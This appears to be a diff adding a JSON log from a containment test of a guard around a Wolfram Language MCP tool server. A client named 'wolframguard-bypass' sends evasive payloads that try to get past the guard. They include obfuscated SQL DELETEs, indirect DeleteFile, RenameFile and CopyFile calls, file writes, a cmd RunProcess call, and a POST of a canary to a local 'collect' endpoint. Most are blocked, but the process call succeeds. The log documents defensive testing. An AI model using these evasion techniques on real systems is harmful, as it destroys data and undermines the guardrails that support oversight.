@@ -1,0 +1,742 @@
+[
+  {
+    "timestamp": "2026-11-15T10:36:13.245786+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 1,
+      "method": "initialize",
+      "params": {
+        "protocolVersion": "2025-06-18",
+        "capabilities": {},
+        "clientInfo": {
+          "name": "wolframguard-bypass",
+          "version": "1"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:21.572705+00:00",
+    "direction": "server->client",
+    "non_json": "WolframGuard installed with policy ContainmentOnly\r\n"
+  },
+  {
+    "timestamp": "2026-11-15T10:36:23.028301+00:00",
+    "direction": "server->client",
+    "non_json": "WolframGuard: OS read-only lock applied to C:\\Users\\Lenovo\\OneDrive\\Documentos\\ChatGPT\\wolfram-guard\\wolframguard-poc\\results\\wolframguard-containment-001\\containmentonly\\fixtures\r\n"
+  },
+  {
+    "timestamp": "2026-11-15T10:36:37.104400+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 1,
+      "result": {
+        "protocolVersion": "2025-06-18",
+        "capabilities": {
+          "prompts": {},
+          "tools": {
+            "listChanged": true
+          }
+        },
+        "serverInfo": {
+          "name": "WolframLanguage",
+          "version": "2.2.0"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:37.107553+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "method": "notifications/initialized"
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:37.144817+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_00\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DELETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:46.920172+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"j34z8fxq\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:46.985192+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 3,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_01\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"delete from customers where status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:47.623477+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 3,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"Bp1RMxoh\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:47.686441+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 4,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_02\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DELETE/**/FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:48.271982+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 4,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"iESWngl0\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:48.326921+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 5,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_03\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DE\" <> \"LETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:49.011428+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 5,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"YE3LZ45t\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:49.072185+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 6,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_04\\\\fixture\\\\customers.sqlite\"]], r = Null}, q = \"DE\" <> \"LETE FROM customers WHERE status='inactive'\"; r = DatabaseLink`SQLExecute[c, q]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:49.661936+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 6,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"dXQPnnRS\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:49.720216+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 7,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "ToExpression[\"Needs[\\\"DatabaseLink`\\\"];cc=DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\\\"SQLite\\\",\\\"C:\\\\\\\\Users\\\\\\\\Lenovo\\\\\\\\OneDrive\\\\\\\\Documentos\\\\\\\\ChatGPT\\\\\\\\wolfram-guard\\\\\\\\wolframguard-poc\\\\\\\\results\\\\\\\\wolframguard-containment-001\\\\\\\\containmentonly\\\\\\\\fixtures\\\\\\\\payload_05\\\\\\\\fixture\\\\\\\\customers.sqlite\\\"]];DatabaseLink`SQLExecute[cc,\\\"DE\\\"<>\\\"LETE FROM customers WHERE status='inactive'\\\"];DatabaseLink`CloseSQLConnection[cc]\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:50.359361+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 7,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= {}"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"P2V9Y8K1\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:50.415460+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 8,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_06\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = Symbol[\"DatabaseLink`SQLExecute\"][c, \"DELETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:51.233466+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 8,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "JDBC::error: \"[SQLITE_READONLY] Attempt to write a readonly database (attempt to write a readonly database)\"\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"dTy03PED\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:51.315203+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 9,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "DeleteFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_07\\\\fixture\\\\research\\\\research_10.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:52.013370+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 9,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "DeleteFile::fdnfnd: Directory or file \"\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... payload_07\\\\fixture\\\\research\\\\research_10.txt\"\" not found.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"UGV3F9fe\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:52.084821+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 10,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "RenameFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_08\\\\fixture\\\\research\\\\research_09.txt\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_08\\\\fixture\\\\research\\\\research_09.bak\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:52.726216+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 10,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "RenameFile::privv0: Specified file or directory cannot be accessed.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"oD5veLEk\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:52.796376+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 11,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Symbol[\"DeleteFile\"][\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_09\\\\fixture\\\\research\\\\research_08.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:53.558167+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 11,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "DeleteFile::ioarg: I/O operation is not valid for \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... payload_09\\\\fixture\\\\research\\\\research_08.txt\".\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"LTAIHWGZ\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:53.615282+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 12,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "With[{g = DeleteFile}, g[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_10\\\\fixture\\\\research\\\\research_07.txt\"]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:54.307839+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 12,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "DeleteFile::ioarg: I/O operation is not valid for \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... payload_10\\\\fixture\\\\research\\\\research_07.txt\".\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"UP2iQZga\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:54.383594+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 13,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "ToExpression[StringJoin[\"Delete\", \"File\"][\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_11\\\\fixture\\\\research\\\\research_06.txt\"]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:55.194763+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 13,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "ToExpression::notstrbox: \"DeleteFile\"[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Docum ... ayload_11\\\\fixture\\\\research\\\\research_06.txt\"] is not a string or a box. ToExpression can only interpret strings or boxes as Wolfram Language input.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"Luu262UX\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:55.263515+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 14,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Module[{s = OpenWrite[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_12\\\\fixture\\\\EVIL_openwrite.txt\"]}, WriteString[s, \"x\"]; Close[s]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:56.601021+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 14,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "OpenWrite::noopen: Cannot open \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... tures\\\\payload_12\\\\fixture\\\\EVIL_openwrite.txt\".\nWriteString::strml: $Failed is not a string, stream or list of strings and streams.\nClose::stream: $Failed is not a string, SocketObject, InputStream[ ] or OutputStream[ ].\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= Close[$Failed]"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"nbDFQbvo\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:56.678635+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 15,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Export[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_13\\\\fixture\\\\EVIL_export.txt\", \"x\", \"Text\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:57.390210+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 15,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "OpenWrite::noopen: Cannot open \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... fixtures\\\\payload_13\\\\fixture\\\\EVIL_export.txt\".\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"LHnsgIjv\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:57.473811+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 16,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Put[42, \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_14\\\\fixture\\\\EVIL_put.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:58.330941+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 16,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Put::noopen: Cannot open \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... y\\\\fixtures\\\\payload_14\\\\fixture\\\\EVIL_put.txt\".\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"SR2yhiln\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:58.402904+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 17,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Module[{wgx = 7}, DumpSave[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_15\\\\fixture\\\\EVIL_dump.mx\", wgx]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:59.265005+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 17,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "DumpSave::noopen: Cannot open \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGP ... y\\\\fixtures\\\\payload_15\\\\fixture\\\\EVIL_dump.mx\".\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= \nDumpSave[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\result\\\ns\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_15\\\\fixture\\\\EVIL_dump.mx\", \n wgx$11842]"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"sxAqhE30\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:36:59.340473+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 18,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "CopyFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_16\\\\fixture\\\\research\\\\research_01.txt\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\containmentonly\\\\fixtures\\\\payload_16\\\\fixture\\\\EVIL_copy.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:37:00.187360+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 18,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "CopyFile::privv0: Specified file or directory cannot be accessed.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"crgBqq2C\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:37:00.273002+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 19,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "RunProcess[{\"cmd\", \"/c\", \"echo wolframguard\"}]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:37:01.553108+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 19,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= <|\"ExitCode\" -> 0, \"StandardOutput\" -> \"wolframguard\\r\\n\", \"StandardError\" -> \"\"|>"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"mmbXHuv6\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:37:01.658249+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 20,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "URLRead[HTTPRequest[\"http://127.0.0.1:8765/collect\", <|\"Method\" -> \"POST\", \"Body\" -> \"WOLFRAMGUARD_SYNTHETIC_CANARY_V1_NO_REAL_VALUE\"|>]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:37:02.805005+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 20,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "URLRead::offline: The Wolfram Language is currently configured not to use the Internet. To allow Internet use set $AllowInternet = True or check the \"Allow the Wolfram Language to use the Internet\" box in the Help ▶ Internet & Mail Settings dialog.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= \nFailure[\"ConnectionFailure\", <|\"MessageTemplate\" :> URLRead::iurl, \n  \"MessageParameters\" -> {\"http://127.0.0.1:8765/collect\"}, \n  \"URL\" -> \"http://127.0.0.1:8765/collect\", \"HTTPRequest\" -> \n   HTTPRequest[\"http://127.0.0.1:8765/collect\", <|\"Method\" -> \"POST\", \n     \"Body\" -> \"WOLFRAMGUARD_SYNTHETIC_CANARY_V1_NO_REAL_VALUE\"|>], \"Counter\" -> 1|>]"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"QGqOQZfi\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  }
+]
